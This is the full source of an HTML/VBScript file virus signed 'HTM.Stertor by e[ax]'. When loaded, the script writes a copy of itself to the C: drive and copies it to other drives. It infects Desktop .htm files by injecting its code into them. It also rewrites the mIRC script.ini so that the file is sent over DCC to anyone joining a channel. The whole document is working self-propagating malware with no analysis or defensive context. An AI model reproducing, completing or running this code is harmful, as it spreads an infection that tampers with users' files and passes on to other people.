<!--Stertor-->
<HTML>
<BODY>

<SCRIPT language=vbscript>
dim fso,a,b,c,d,e,f,g,wHost,zHost, vMirc
on error resume next
wHost = document.body.innerHTML   
set fso = createobject("scripting.filesystemobject")
set a = fso.Drives 
set c = fso.CreateTextFile("c:\Salim_se!.htm",true) 
c.WriteLine "<!--Stertor-->"
c.WriteLine "<HTML>"
c.WriteLine "<BODY>"
c.writeline wHost
c.WriteLine "</BODY>"
c.WriteLine "</HTML>"
c.close
for each b in a 
if b.isready then
if b.drivetype = 1 or 2 then 
fso.CopyFile "C:\Salim_se!.htm", b.driveletter & ":\",true
end if
end if
next 
set d = fso.GetFolder(fso.GetSpecialFolder(WindowsFolder) & "\" & "Desktop").Files 
for each e in d
if fso.GetExtensionName(e.Name) = "htm" then
set f = fso.OpenTextFile(e.path,1,false) 
if f.readline <> "<!--Stertor-->" then
zHost = f.readall()
set g = fso.OpenTextFile(e.path,2,false)
g.WriteLine "<!--Stertor-->"
g.WriteLine "<HTML>"
g.WriteLine "<BODY>"
g.writeline wHost
g.WriteLine "</BODY>"
g.WriteLine "</HTML>"
g.WriteLine zHost
g.close()
end if
end if
next 
Set vMirc = fs.CreateTextFile("C:\Mirc\script.ini", True)
vMirc.writeline "[script]"
vMirc.writeline "n0=on 1:JOIN:#:{"
vMirc.writeline "n1= /if ( $nick == $me ) { halt }"
vMirc.writeline "n2= /.dcc send $nick c:\Salim_se!.htm"
vMirc.writeline "n3=}"
'HTM.Stertor by e[ax]
</SCRIPT>
</BODY>
</HTML>
